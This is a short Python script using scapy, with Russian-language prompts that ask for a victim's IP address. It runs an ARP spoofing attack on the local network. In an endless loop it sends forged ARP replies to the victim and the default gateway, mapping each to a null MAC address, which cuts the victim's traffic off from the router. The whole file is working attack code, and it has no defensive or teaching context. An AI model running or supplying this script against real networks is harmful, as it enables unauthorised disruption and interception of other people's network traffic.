import time
import random

import scapy.all as scapy
scapy.show_interfaces()

iface = input("Введите интерфейс или пропуск если нет: ")
if iface != "":
  scapy.conf.iface = iface


def poison(target, router, targetMAC):
    arp_reply = scapy.ARP(pdst=target, hwdst=targetMAC, psrc=router, hwsrc=FAKE_MAC, op=2)
    scapy.send(arp_reply, verbose=0)

FAKE_MAC = "00:00:00:00:00:00"
target = input('Введите ip адрес жертвы (пример: X.X.X.X): ')
router = scapy.conf.route.route("0.0.0.0")[2]



while 1:

	targetMAC = str(scapy.getmacbyip(target))
	routerMAC = str(scapy.getmacbyip(router))
	print("[ARP] -",targetMAC,routerMAC)
	poison(target, router, targetMAC)
	poison(router,target, routerMAC)
	time.sleep(random.uniform(0.3, 1.7))

